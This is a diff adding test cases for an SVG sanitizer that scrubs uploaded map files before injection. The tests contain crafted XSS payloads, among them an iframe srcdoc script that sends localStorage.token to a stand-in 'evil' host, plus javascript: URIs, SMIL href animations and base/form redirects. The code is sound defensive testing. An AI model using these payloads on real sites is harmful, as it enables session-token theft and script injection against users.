@@ -162,7 +162,7 @@ describe('layers 4-6 — delivery surface: CSP, Dropbox SDK, service worker', ()
 // idiom as the layers above for the functional guards.
 
 describe('wave-1 layer A — the uploaded .map SVG segment is scrubbed before injection', () => {
-  const sanitizeMapSvg = evalBlock(GENERAL_SRC, 'function sanitizeMapSvg', 'sanitizeMapSvg');
+  const sanitizeMapSvg = evalBlock(GENERAL_SRC, 'const UNSAFE_SVG_TAGS', 'sanitizeMapSvg');
 
   test('strips <script>, inline event handlers and javascript: hrefs from a crafted data[5]', () => {
     const out = sanitizeMapSvg(
@@ -185,6 +185,57 @@ describe('wave-1 layer A — the uploaded .map SVG segment is scrubbed before in
     expect(out).toMatch(/id="map"/);
     expect(out).toMatch(/fill="red"/);
     expect(out).toContain('data:image/png;base64,AAAA');
+  });
+
+  // cycle-3 hardening: the weak version stripped only <script>/on*/javascript:,
+  // leaving these token-exfiltration vectors. Each is an independent XSS on the
+  // same-origin, auth-token-bearing /map/ frame.
+  test('strips the HTML-embedding vectors the weak version missed', () => {
+    const out = sanitizeMapSvg(
+      '<svg id="map"></svg>' +
+        '<iframe srcdoc="<script>fetch(&quot;https://evil/?t=&quot;+localStorage.token)</script>"></iframe>' +
+        '<iframe src="javascript:window.pwned=1"></iframe>' +
+        '<object data="javascript:window.pwned=1"></object>' +
+        '<embed src="javascript:window.pwned=1">' +
+        '<base href="https://evil/">' +
+        '<form action="https://evil/"></form>',
+    );
+    expect(out).not.toMatch(/<iframe/i);
+    expect(out).not.toMatch(/srcdoc/i);
+    expect(out).not.toMatch(/<object/i);
+    expect(out).not.toMatch(/<embed/i);
+    expect(out).not.toMatch(/<base/i);
+    expect(out).not.toMatch(/<form/i);
+    expect(out).not.toMatch(/javascript:/i);
+  });
+
+  test('strips the SVG-specific vectors: foreignObject and SMIL href animation', () => {
+    const out = sanitizeMapSvg(
+      '<svg id="map">' +
+        '<foreignObject><iframe srcdoc="<script>1</script>"></iframe></foreignObject>' +
+        '<a><animate attributeName="href" values="javascript:window.pwned=1"/></a>' +
+        '<set attributeName="href" to="javascript:window.pwned=1"/>' +
+        '</svg>',
+    );
+    expect(out).not.toMatch(/foreignobject/i);
+    expect(out).not.toMatch(/<iframe/i);
+    expect(out).not.toMatch(/javascript:/i);
+    // the map id survives — only the vectors are removed
+    expect(out).toMatch(/id="map"/);
+  });
+
+  test('blocks data:text/html navigation but keeps embedded raster images', () => {
+    const out = sanitizeMapSvg(
+      '<svg id="map">' +
+        '<a xlink:href="data:text/html,<script>1</script>">x</a>' +
+        '<image xlink:href="data:image/png;base64,AAAA"/>' +
+        '<style>#map rect{fill:blue}</style>' +
+        '</svg>',
+    );
+    expect(out).not.toMatch(/data:text\/html/i);
+    expect(out).toContain('data:image/png;base64,AAAA');
+    // <style> is legitimate map styling and must survive (modern CSS cannot run JS)
+    expect(out).toMatch(/<style/i);
   });
 
   test('load.js routes data[5] through the scrubber, never raw', () => {
